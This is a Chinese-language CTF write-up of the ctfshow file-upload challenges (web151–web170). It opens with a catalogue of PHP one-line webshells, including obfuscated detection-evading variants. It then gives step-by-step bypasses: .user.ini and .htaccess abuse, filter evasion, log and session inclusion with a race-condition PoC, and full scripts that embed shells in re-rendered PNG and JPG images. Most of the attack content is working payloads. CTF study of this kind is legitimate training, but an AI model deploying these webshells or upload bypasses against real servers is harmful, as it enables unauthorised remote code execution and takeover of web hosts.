# ctfshow_file_upload


ctfshow文件上传专题

<!--more-->

## 总结：

[CTF中文件上传及文件包含总结](https://www.ngui.cc/el/3197856.html?action=onClick)

[CTF文件上传漏洞总结](http://cn-sec.com/archives/1116089.html)

文件上传马儿总结：

```php
短标签马儿：
	一般的马儿：
<?php eval（$_POST['cmd']);?>
	没有PHP的马儿
<?= eval（$_POST['cmd']);?>
<? eval（$_POST['cmd']);?>
<% eval（$_POST['cmd']);%>
	有PHP的马儿
<script language="php"></script>

特殊马儿：
	过滤[]：用{}代替
	<?= eval（$_POST['cmd']);?>

直接拿flag的变形马儿
	<? echo `tac /var/www/html/f*`;?>
	<? echo `tac /var/www/html/f*`?>
	
免杀马儿：
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>

    
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>

    
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>

    
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>
```



## 靶场题目：

### [web151]前端校验文件类型

前端校验文件类型，上传png图片马

再通过bp抓包修改文件后缀，蚁剑连接

![image-20230725170506084](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png)

修改后缀为php

![image-20230725170630382](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png)

蚁剑连接读flag

![image-20230725170711639](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png)

### [web152]后端验证Content-Type

后端验证实际上是验证Content-Type

![image-20230725172718121](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png)

![image-20230725172654596](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png)

### [web153].user.ini

**.user.ini**

原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。

**注：**

```
auto_append_file在木马文件上传后上传  auto_prepend_file在木马文件上传前上传
```

这道题按照前面两种方法无法上传

后面加了png头文件，php大写可以上传，但是蚁剑无法连接，用php3也不行

url上输入 /upload/

显示了nothing here表示可以用配置文件（因为upload目录下有php文件）

![image-20230726103310890](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png)

以这样的方式上传，再改包，不然上传不了

然后直接上传写了一句话木马的png

上传成功后用蚁剑连接

```
http://1db86d8a-c57c-4b7f-b60c-2efd317295cc.challenge.ctf.show/upload/index.php
```

![image-20230726103638336](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png)

当然当我们再次访问/upload时：

![image-20230726103906855](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png)

### [web154]短标签

上题思路可解

如果带木马的不行，然后就更换短标签一个个试

```php
<?= eval($_POST[1]);?>
```

web155(内容过滤php)同上

### [web156]`[]`过滤

 过滤了文件内的`[]`,可以改成`{}`来绕过

![image-20230726114212624](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png)

### [web157]bypass

经测试，对文件内容过滤了 `php`、`[`、`{`、 `;`

上传`.user.ini`

 php 最后的语句也可以不加分号的，前提是得有 `?>`结束标志。

修改图片马的内容

```
<?=system('ls ../')?>
```

通过ls查看flag文件的位置，写入之后访问`/upload/index.php`查看回显

使用cat或tac读取信息

```
<?=system('cat ../*')?>
```

![image-20230726150235091](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png)

web158思路同上

web159过滤了括号`()`,我们可以用反引号来代替`system()`

```
<?=`cat ../*`?>
```

### [web160]bypass``

过滤了反引号，我们可以包含日志

```
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

但发现 `log`也被过滤了，可以使用`""`来拼接

尝试一句话木马UA头：`<?php eval($_POST[x]);?>`

![image-20230726151942012](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png)

上述UA头会引发报错，尝试`<?php system('ls');?>`

![image-20230726152150496](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png)

有预期回显，进一步修改：

```
<?php system('ls ../');?>
```

确定flag.php的位置，tac读取flag

```
<?php system('tac ../flag.phpS');?>
```

### [web161]检测文件头

检测文件头

上传 `GIF89a`成功绕过

![image-20230726152634628](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png)

其余思路同上
![image-20230726153507813](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png)

### [web162]`.`bypass-竞争上传

检测了文件头，同时过滤了点`.`

**session包含**

**条件竞争：**我们上传的文件如果不符合要求，就会被删除，导致成功上传无法访问，没有用。但是如果我们上传的速度比服务器删的速度快，就可以了。

修改ini文件内容

.user.ini:

```
GIF89a
auto_prepend_file=a
```

随后修改并上传a文件：

```
GIF89a
<?=include"/tmp/sess_fllag"?>
```

构造，session文件竞争包含poc:

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://58b10a1f-08e0-4689-8b64-2e8641d2948b.chall.ctf.show/" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="2333" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>
```

![image-20230726155914013](C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20230726155914013.png)

`Cookie:PHPSESSID=fllag`

`2333<?php $code='<?php eval($_POST[1]);?>;file_put_contents('a.php',$code);?>`



也可以远程包含自己vps上的马

### [web164]PNG二次渲染

**PNG二次渲染**

尝试上传图片，查看上传后的路径，存在文件包含

```
http://5b82c70e-ecd3-4ebb-9665-11ce8c1a5b74.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png
```

这里用到一个工具：

```
https://github.com/huntergregal/PNG-IDAT-Payload-Generator
```

cmd命令：

```
python generate.py -m php -p ma.php -o a.png
```

得到a.png可以上传

上传后再执行命令：
get：`&0=system`
post：`1=tac flag.php`

![image-20230727105340210](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png)

浏览器页面图片没有直接回显，下载图片也可以看到flag信息

![image-20230727105450503](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png)

另外还有php生成png二次渲染马的脚本，直接运行可生成png图片：

```php
<?php
 $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
            0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
            0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
            0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
            0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
            0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
            0x66, 0x44, 0x50, 0x33);
 
 $img = imagecreatetruecolor(32, 32);
 
 for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
 }
 
 imagepng($img,'./1.png');
 ?>
```

### [web165]JPG二次渲染

**JPG二次渲染**

相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。

上传正常jpg图片后访问，抓包发到重放器中，发现图片经过二次渲染
![image-20230727111023352](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png)

与png图片二次渲染的区别在于，需要一张上传上去再下载下来的图片，然后跑脚本

```
php exp.php 1.jpg
```

php脚本：

```php
<?php
/*

The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
It is necessary that the size and quality of the initial image are the same as those of the processed image.

1) Upload an arbitrary image via secured files upload script
2) Save the processed image and launch:
jpg_payload.php <jpg_name.jpg>

In case of successful injection you will get a specially crafted image, which should be uploaded again.

Since the most straightforward injection method is used, the following problems can occur:
1) After the second processing the injected data may become partially corrupted.
2) The jpg_payload.php script outputs "Something's wrong".
If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

Sergey Bobrov @Black2Fan.

See also:
https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

*/

$miniPayload = "<?=eval(\$_POST[1]);?>";


if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    die('php-gd is not installed');
}

if(!isset($argv[1])) {
    die('php jpg_payload.php <jpg_name.jpg>');
}

set_error_handler("custom_error_handler");

for($pad = 0; $pad < 1024; $pad++) {
    $nullbytePayloadSize = $pad;
    $dis = new DataInputStream($argv[1]);
    $outStream = file_get_contents($argv[1]);
    $extraBytes = 0;
    $correctImage = TRUE;

    if($dis->readShort() != 0xFFD8) {
        die('Incorrect SOI marker');
    }

    while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
        $marker = $dis->readByte();
        $size = $dis->readShort() - 2;
        $dis->skip($size);
        if($marker === 0xDA) {
            $startPos = $dis->seek();
            $outStreamTmp =
                substr($outStream, 0, $startPos) .
                $miniPayload .
                str_repeat("\0",$nullbytePayloadSize) .
                substr($outStream, $startPos);
            checkImage('_'.$argv[1], $outStreamTmp, TRUE);
            if($extraBytes !== 0) {
                while((!$dis->eof())) {
                    if($dis->readByte() === 0xFF) {
                        if($dis->readByte !== 0x00) {
                            break;
                        }
                    }
                }
                $stopPos = $dis->seek() - 2;
                $imageStreamSize = $stopPos - $startPos;
                $outStream =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    substr(
                        str_repeat("\0",$nullbytePayloadSize).
                        substr($outStream, $startPos, $imageStreamSize),
                        0,
                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                    substr($outStream, $stopPos);
            } elseif($correctImage) {
                $outStream = $outStreamTmp;
            } else {
                break;
            }
            if(checkImage('payload_'.$argv[1], $outStream)) {
                die('Success!');
            } else {
                break;
            }
        }
    }
}
unlink('payload_'.$argv[1]);
die('Something\'s wrong');

function checkImage($filename, $data, $unlink = FALSE) {
    global $correctImage;
    file_put_contents($filename, $data);
    $correctImage = TRUE;
    imagecreatefromjpeg($filename);
    if($unlink)
        unlink($filename);
    return $correctImage;
}

function custom_error_handler($errno, $errstr, $errfile, $errline) {
    global $extraBytes, $correctImage;
    $correctImage = FALSE;
    if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
        if(isset($m[1])) {
            $extraBytes = (int)$m[1];
        }
    }
}

class DataInputStream {
    private $binData;
    private $order;
    private $size;

    public function __construct($filename, $order = false, $fromString = false) {
        $this->binData = '';
        $this->order = $order;
        if(!$fromString) {
            if(!file_exists($filename) || !is_file($filename))
                die('File not exists ['.$filename.']');
            $this->binData = file_get_contents($filename);
        } else {
            $this->binData = $filename;
        }
        $this->size = strlen($this->binData);
    }

    public function seek() {
        return ($this->size - strlen($this->binData));
    }

    public function skip($skip) {
        $this->binData = substr($this->binData, $skip);
    }

    public function readByte() {
        if($this->eof()) {
            die('End Of File');
        }
        $byte = substr($this->binData, 0, 1);
        $this->binData = substr($this->binData, 1);
        return ord($byte);
    }

    public function readShort() {
        if(strlen($this->binData) < 2) {
            die('End Of File');
        }
        $short = substr($this->binData, 0, 2);
        $this->binData = substr($this->binData, 2);
        if($this->order) {
            $short = (ord($short[1]) << 8) + ord($short[0]);
        } else {
            $short = (ord($short[0]) << 8) + ord($short[1]);
        }
        return $short;
    }

    public function eof() {
        return !$this->binData||(strlen($this->binData) === 0);
    }
}

```

执行成功后会生成**payload_1.jpg**

![image-20230728012935422](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png)

上传后可搭配bp抓包实现命令执行

### [web166]zip

只能上传zip，那我们就上传一个一句话的zip文件，然后用蚁剑连接

新建一个zip文件，后面插入一句话木马

```
<?php eval(@$_POST['a']); ?>
```

需要注意的是`Content-Type`为`application/x-zip-compressed`

![image-20230728020642046](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png)

可以用蚁剑直接连接`http://28bac684-221f-4841-8c98-b81c4f551965.challenge.ctf.show:8080/upload/download.php?file=de9373c30bd8d73705a6d44209947715.zip`

![image-20230728020601373](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png)

### [web167].htaccess

根据提示上传了包含shell的jpg文件,上传成功,点击下载文件,发现没有存在文件包含点,访问upload检查是否有可执行文件,提示没有权限,但是发现中间件是Apache

![image-20230728103941301](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png)

.htaccess文件中写入

```
AddType application/x-httpd-php .jpg
<!-将jpg文件按照php文件解析-->
```

或者写入

```
Sethandler application/x-httpd-php
<!-将该目录及子目录下的文件均按照php文件解析执行-->
```

通过改包文件后缀名的方式上传.htaccess

![image-20230728105548335](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png)

随后上传带有一句话木马的jpg文件
![image-20230728105902636](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png)

hackbar命令执行或者蚁剑连接

### [web168]免杀马

png改包为php，但需要免杀马

```
<?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ=='),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode('YQ==').base64_decode('bA==').chr(060340/01154).chr(01041-0775).base64_decode('cw==').str_rot13('b').chr(01504-01327).base64_decode('ZQ==').chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode('NjgxO'.'Tc7QG'.'V2QWw'.'oJF9Q'.''.str_rot13('G').str_rot13('1').str_rot13('A').base64_decode('VQ==').str_rot13('J').''.''.chr(0x304-0x2d3).base64_decode('Ug==').chr(13197/249).str_rot13('F').base64_decode('MQ==').''.'B1bnR'.'VXSk7'.'MjA0N'.'TkxOw'.'=='.''));?>
```

蚁剑连接`*****/upload/1.php`

密码`TyKPuntU`

![image-20230728120650152](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png)

还有其他的免杀马：

```php
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>
```

再如：

```php
<?php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);
?>
```

再如：

```php
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>
```

![image-20230728121442185](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png)

### [web169]日志包含

过滤了`<`，无法执行PHP代码，于是考虑**日志包含**

前端限制必须上传zip，且`file_content`需修改为`image/png`

同时在`user-agent`中写入一句话木马，`<?php eval（$_POST['cmd']);?>`

随后上传一个`.user.ini`文件，`auto_prepend_file=/var/log/nginx/access.log`

再上传一个`1.php`文件，内容随便写，因为`url/upload/`目录下没有文件，所以需要写一个文件来承接`.user.ini`

接着就可以访问`/url/upload/1.php`，然后rce或者用蚁剑连接

### [web170]日志包含

题解同上

